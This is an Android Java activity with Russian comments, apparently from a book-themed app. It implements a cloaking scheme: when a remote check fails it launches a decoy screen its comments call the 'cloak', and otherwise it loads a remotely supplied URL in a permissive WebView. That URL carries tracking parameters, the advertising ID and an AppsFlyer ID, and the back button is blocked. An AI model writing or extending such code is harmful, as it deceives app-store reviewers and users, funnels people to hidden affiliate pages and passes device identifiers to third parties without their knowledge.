package com.pyramidzzzbook.activities;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Parcelable;
import android.provider.MediaStore;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;

import com.pyramidzzzbook.MainActivity;
import com.pyramidzzzbook.R;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;

import static com.pyramidzzzbook.GlobalClass.adId;
import static com.pyramidzzzbook.GlobalClass.counter;
import static com.pyramidzzzbook.GlobalClass.dataSource;
import static com.pyramidzzzbook.GlobalClass.finalInputLine;
import static com.pyramidzzzbook.GlobalClass.inputLine;
import static com.pyramidzzzbook.GlobalClass.sharedPrefsHelper;
import static com.pyramidzzzbook.GlobalClass.sub1;
import static com.pyramidzzzbook.GlobalClass.sub10;
import static com.pyramidzzzbook.GlobalClass.sub2;
import static com.pyramidzzzbook.GlobalClass.sub3;
import static com.pyramidzzzbook.GlobalClass.sub4;
import static com.pyramidzzzbook.GlobalClass.sub5;
import static com.pyramidzzzbook.GlobalClass.sub9;


public class WebActivity extends AppCompatActivity {
    //объявляем веб вью
    private WebView view;

    //объявляем переменные для файловой системы
    private ValueCallback<Uri> mUploadMessage;
    private Uri mCapturedImageURI = null;
    private ValueCallback<Uri[]> mFilePathCallback;
    private String mCameraPhotoPath;
    private static final int INPUT_FILE_REQUEST_CODE = 1;
    private static final int FILECHOOSER_RESULTCODE = 1;
    private static final String TAG = MainActivity.class.getSimpleName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_web);
        //***БЛОК ВЫПОЛНЕНИЯ ОСНОВНЫХ МЕТОДОВ ПО РАБОТЕ С WEBVIEW***//

        //1)
        // init content
        initContent();

        //2)
        //выключаем ограничение по треду
        dataSource.offStrictPolicy();


        //3)//читаем текст (ссылку) с изначальной web-page и присваиваем глобальной переменной
        //отлавливаем IO и NullPointer
        try {
            //проверяем ответ от проверочной ссылки
            //если пустая строка или null -->
            if(sharedPrefsHelper.getResponse()  == "" || sharedPrefsHelper.getResponse() == null){
                //стартуем клоаку
                startActivity(new Intent(WebActivity.this, MainActivity.class));
            } else {
                //присваиваем переменной вторую ссылку
                getMainUrl(sharedPrefsHelper.getResponse());
            }
        } catch (NullPointerException | IOException e) {
            e.printStackTrace();
            //стартуем клоаку
            startActivity(new Intent(WebActivity.this, MainActivity.class));
        }


        //4)
        //включаем здесь всё необходимое для веб вью
        turnWebViewSettings();

        //сеттим коллбеки на вебвью
        setCallbacks();

        //сеттим файловую систему на хром табсах
        setChromeClient();

        //5)
        //проверяем на первый запуск и прокидывем ссылку в веб вью
        checkOnFirstLaunch();
        // view.loadUrl("https://fixd.info/yzVDLYL5");



        //view.loadUrl("https://fixd.info/yzVDLYL5?sub1=test&sub2=test&sub3=test&sub4=test&sub5=test&sub6=com.testappsflyerapp&sub7=1415211453000-6513894&sub8=9c9a82fb-d5de-4cd1-90c3-527441c11828&sub9=test&sub10=test");
    }

    //делаем коллбеки по загрузке страниц
    private void setCallbacks(){
        view.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(@Nullable WebView view, @Nullable String url) {
                //засовываем ссылку последней сохранённой страницы в префы
                sharedPrefsHelper.setPrefsUrl(url);

                //реализация механизма сохранения предыдущей ссылки//
                //проверяем каунтер на чётное/нечётное
                if(counter % 2 == 0) {
                    //если чётное -> не выполняем ничего

                    //добавляем единичку к счётчику
                    counter++;
                } else {
                    //если нечётное ->
                    //сохраняем значение ссылки в safe (это всегда будет предыдущая от текущей ссылки)
                    sharedPrefsHelper.setPrefsSafeLink(url);
                    counter++;
                }
            }

            @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
            @Override
            public void onReceivedError(@Nullable WebView view, @Nullable WebResourceRequest request, @Nullable WebResourceError error) {
                super.onReceivedError(view, request, error);
                //обрабатываем ошибки
                //проверяем схожесть текущей ссылки (где ошибка) с ссылкой, которая была сохранена второй
                if(request.getUrl().toString().equals(sharedPrefsHelper.getPrefsSafeLink())){
                    //если одинаковы - >
                    //открываем изначальную ссылку с сабками
                    //проверяем на правильность получения имя кампании
                    //если в переменной есть символы 'sub' - значит получили нейминг правильно ->
                    if (sharedPrefsHelper.getCampaign().contains("sub")){
                        //открываем ссылку с сабами
                        view.loadUrl(getTargetUrlWithSubs());
                        //ставим флаг на первый запуск
                        sharedPrefsHelper.setFirstLaunch();
                    }
                    //если нету символов - значит ошибка либо органика
                    //выполняем ->
                    else {
                        //загружаем полученную из начального web-pag'a cсылку
                        view.loadUrl(getTargetUrl());
                        //ставим флаг на первый запуск
                        sharedPrefsHelper.setFirstLaunch();
                    }
                }
                //если ссылки разные
                else {
                    //открываем safe-ссылку
                    view.loadUrl(sharedPrefsHelper.getPrefsSafeLink());
                }
            }
        });
    }


    //отключаем принудительную перезагрузку вебвью при перевороте экрана
    @Override
    public void onConfigurationChanged(Configuration newConfig){
        super.onConfigurationChanged(newConfig);
    }

    //инициализируем всё нужное
    private void initContent(){
        //webview элемент
        view =  findViewById(R.id.webview);

    }





    //получаем ссылку путём считки веб страницы, ссылку на которую мы получили из ремоут конфига и присваиваем глобальной переменной
    private void getMainUrl(String firstUrl) throws IOException {
        try  {
            Log.d("url1", "test2");
            URL oracle = new URL(firstUrl);
            BufferedReader in = new BufferedReader(new InputStreamReader(oracle.openStream()));
            while ((inputLine = in.readLine()) != null)
                finalInputLine = inputLine;
            Log.d("url1", inputLine);
            in.close();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    //включаем необходимые функции
    public void turnWebViewSettings(){
        view.getSettings().setJavaScriptEnabled(true);
        view.getSettings().setCacheMode(WebSettings.LOAD_CACHE_ELSE_NETWORK);
        view.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        view.getSettings().setGeolocationEnabled(true);
        view.getSettings().setUseWideViewPort(true);
        view.getSettings().setLoadWithOverviewMode(true);
        view.getSettings().setAllowContentAccess(true);
        view.getSettings().setDatabaseEnabled(true);
        view.getSettings().setLoadsImagesAutomatically(true);
        view.setFocusable(true);
        view.setFocusableInTouchMode(true);
        view.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        view.getSettings().setDomStorageEnabled(true);
        view.getSettings().setAppCacheEnabled(true);
        view.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);
        view.getSettings().setSupportZoom(true);
        view.getSettings().setUserAgentString(System.getProperty("http.agent"));
    }

    //чекаем на первый запуск
    private void checkOnFirstLaunch(){
        //проверяем на первый запуск
        //если не первый ->
        if (sharedPrefsHelper.getFirstLaunch()){
            //загружаем последнюю ссылку, вытаскиваем её из префов
            Log.d("testing",sharedPrefsHelper.getPrefsUrl());
            view.loadUrl(sharedPrefsHelper.getPrefsUrl());
        }
        //если первый ->
        else {
            //проверяем на правильность получения имя кампании
            //если в переменной есть символы 'sub', sub5 не пустой и не null - значит получили нейминг и диплинки правильно ->
            if (sharedPrefsHelper.getCampaign().contains("sub") && sub5 != null && !sub5.equals("")){
                //открываем ссылку с сабами
                Log.d("testing", getTargetUrlWithAppsFlyerAndDeeps());
                view.loadUrl(getTargetUrlWithAppsFlyerAndDeeps());
                //ставим флаг на первый запуск
                sharedPrefsHelper.setFirstLaunch();

                //если нету дипов и есть только аппс -->
            } else if(sharedPrefsHelper.getCampaign().contains("sub") && sub5 == null) {
                //запускаем ссылку только с аппсом
                getTargetUrlWithSubs();
            }
            //если нету вообще ничего - значит ошибка либо органика
            //выполняем ->
            else {
                //загружаем полученную из начального web-pag'a cсылку
                Log.d("testing", getTargetUrl());
                view.loadUrl(getTargetUrl());
                //ставим флаг на первый запуск
                sharedPrefsHelper.setFirstLaunch();
            }

        }
    }
    // https://fixd.info/yzVDLYL5?sub1=test&sub2=test&sub3=test&sub4=test&sub5=test&sub6=com.testappsflyerapp&sub7=1415211453000-6513894&sub8=9c9a82fb-d5de-4cd1-90c3-527441c11828&sub9=test&sub10=test
    //
    //https://tracklink/sfsdgsg?sub1=acc &sub2=buyer &sub3=promo &sub4=otherparam &sub5=test &sub6=com.app.good &sub7=1415211453000-6513894 &sub8=9c9a82fb-d5de-4cd1-90c3-527441c11828


    //добавляем sub's (параметры, которые получили с имени кампании от AppsFlyer)
    private String getTargetUrlWithSubs(){
        return finalInputLine = finalInputLine + "?" + "sub1=" + sub1 + "&sub2=" + sub2 + "&sub3=" + sub3 + "&sub4=" + sub4 +  "&sub6=" + getPackageName() + "&sub7=" + dataSource.getAppsFlyerUID() + "&sub8=" + adId;
    }

    //добавляем sub6 (имя пакета для дейтинг прилок) и получаем на выходе конечную ссылку в случае органики или нету ни фб, ни нейминга
    private String  getTargetUrl(){
        return finalInputLine = finalInputLine + "?sub6="+getPackageName();
    }

    //добавляем sub's (параметры, которые получили с имени кампании от AppsFlyer)
    private String getTargetUrlWithAppsFlyerAndDeeps(){
        return finalInputLine = finalInputLine + "?" + "sub1=" + sub1 + "&sub2=" + sub2 + "&sub3=" + sub3 + "&sub4=" + sub4 + "&sub5=" + sub5 + "&sub6=" + getPackageName() + "&sub7=" + dataSource.getAppsFlyerUID() + "&sub8=" + adId+  "&sub9=" + sub9 + "&sub10=" + sub10;
    }




    @SuppressLint("NewApi")
    @Override
    protected void onResume() {
        super.onResume();
        view.onResume();
        // ...
    }

    @SuppressLint("NewApi")
    @Override
    protected void onPause() {
        view.onPause();
        // ...
        super.onPause();
    }




    @Override
    public void onBackPressed() {
        if (view.isFocused() && view.canGoBack()) {
            view.goBack();
        } else {

        }
    }



    @Override
    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCode != INPUT_FILE_REQUEST_CODE || mFilePathCallback == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }
            Uri[] results = null;
            // Check that the response is a good one
            if (resultCode == Activity.RESULT_OK) {
                if (data == null) {
                    // If there is not data, then we may have taken a photo
                    if (mCameraPhotoPath != null) {
                        results = new Uri[]{Uri.parse(mCameraPhotoPath)};
                    }
                } else {
                    String dataString = data.getDataString();
                    if (dataString != null) {
                        results = new Uri[]{Uri.parse(dataString)};
                    }
                }
            }
            mFilePathCallback.onReceiveValue(results);
            mFilePathCallback = null;
        } else if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.KITKAT) {
            if (requestCode != FILECHOOSER_RESULTCODE || mUploadMessage == null) {
                super.onActivityResult(requestCode, resultCode, data);
                return;
            }
            if (requestCode == FILECHOOSER_RESULTCODE) {
                if (null == this.mUploadMessage) {
                    return;
                }
                Uri result = null;
                try {
                    if (resultCode != RESULT_OK) {
                        result = null;
                    } else {
                        // retrieve from the private variable if the intent is null
                        result = data == null ? mCapturedImageURI : data.getData();
                    }
                } catch (Exception e) {
                    Toast.makeText(getApplicationContext(), "activity :" + e,
                            Toast.LENGTH_LONG).show();
                }
                mUploadMessage.onReceiveValue(result);
                mUploadMessage = null;
            }
        }
        return;
    }


    //сеттим клиент хром табса
    private void setChromeClient(){
        if (Build.VERSION.SDK_INT >= 21) {
            view.getSettings().setMixedContentMode(0);
            view.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        } else if (Build.VERSION.SDK_INT >= 19) {
            view.setLayerType(View.LAYER_TYPE_HARDWARE, null);
        } else if (Build.VERSION.SDK_INT < 19) {
            view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
        }


        view.setWebChromeClient(new WebChromeClient() {


            private File createImageFile() throws IOException {

                String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss").format(new Date());
                String imageFileName = "JPEG_" + timeStamp + "_";
                File storageDir = Environment.getExternalStoragePublicDirectory(
                        Environment.DIRECTORY_PICTURES);
                File imageFile = File.createTempFile(
                        imageFileName,  /* prefix */
                        ".jpg",         /* suffix */
                        storageDir      /* directory */
                );
                return imageFile;

            }
            @Override
            public boolean onShowFileChooser(WebView view, ValueCallback<Uri[]> filePath, WebChromeClient.FileChooserParams fileChooserParams) {
                // Double check that we don't have any existing callbacks
                if (mFilePathCallback != null) {
                    mFilePathCallback.onReceiveValue(null);
                }
                mFilePathCallback = filePath;
                Intent takePictureIntent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (takePictureIntent.resolveActivity(getPackageManager()) != null) {
                    // Create the File where the photo should go
                    File photoFile = null;
                    try {
                        photoFile = createImageFile();
                        takePictureIntent.putExtra("PhotoPath", mCameraPhotoPath);
                    } catch (IOException ex) {
                        // Error occurred while creating the File
                        Log.e(TAG, "Unable to create Image File", ex);
                    }
                    // Continue only if the File was successfully created
                    if (photoFile != null) {
                        mCameraPhotoPath = "file:" + photoFile.getAbsolutePath();
                        takePictureIntent.putExtra(MediaStore.EXTRA_OUTPUT,
                                Uri.fromFile(photoFile));
                    } else {
                        takePictureIntent = null;
                    }
                }
                Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                contentSelectionIntent.setType("image/*");
                Intent[] intentArray;
                if (takePictureIntent != null) {
                    intentArray = new Intent[]{takePictureIntent};
                } else {
                    intentArray = new Intent[0];
                }
                Intent chooserIntent = new Intent(Intent.ACTION_CHOOSER);
                chooserIntent.putExtra(Intent.EXTRA_INTENT, contentSelectionIntent);
                chooserIntent.putExtra(Intent.EXTRA_TITLE, "Image Chooser");
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS, intentArray);
                startActivityForResult(chooserIntent, INPUT_FILE_REQUEST_CODE);
                return true;
            }
            public void openFileChooser(ValueCallback<Uri> uploadMsg, String acceptType) {
                mUploadMessage = uploadMsg;
                // Create AndroidExampleFolder at sdcard
                File imageStorageDir = new File(
                        Environment.getExternalStoragePublicDirectory(
                                Environment.DIRECTORY_PICTURES)
                        , "AndroidExampleFolder");
                if (!imageStorageDir.exists()) {
                    // Create AndroidExampleFolder at sdcard
                    imageStorageDir.mkdirs();
                }
                // Create camera captured image file path and name
                File file = new File(
                        imageStorageDir + File.separator + "IMG_"
                                + String.valueOf(System.currentTimeMillis())
                                + ".jpg");
                mCapturedImageURI = Uri.fromFile(file);
                // Camera capture image intent
                final Intent captureIntent = new Intent(
                        android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
                captureIntent.putExtra(MediaStore.EXTRA_OUTPUT, mCapturedImageURI);
                Intent i = new Intent(Intent.ACTION_GET_CONTENT);
                i.addCategory(Intent.CATEGORY_OPENABLE);
                i.setType("image/*");
                // Create file chooser intent
                Intent chooserIntent = Intent.createChooser(i, "Image Chooser");
                // Set camera intent to file chooser
                chooserIntent.putExtra(Intent.EXTRA_INITIAL_INTENTS
                        , new Parcelable[] { captureIntent });
                // On select image call onActivityResult method of activity
                startActivityForResult(chooserIntent, FILECHOOSER_RESULTCODE);
            }
            public void openFileChooser(ValueCallback<Uri> uploadMsg,
                                        String acceptType,
                                        String capture) {
                openFileChooser(uploadMsg, acceptType);
            }

        });
    }

}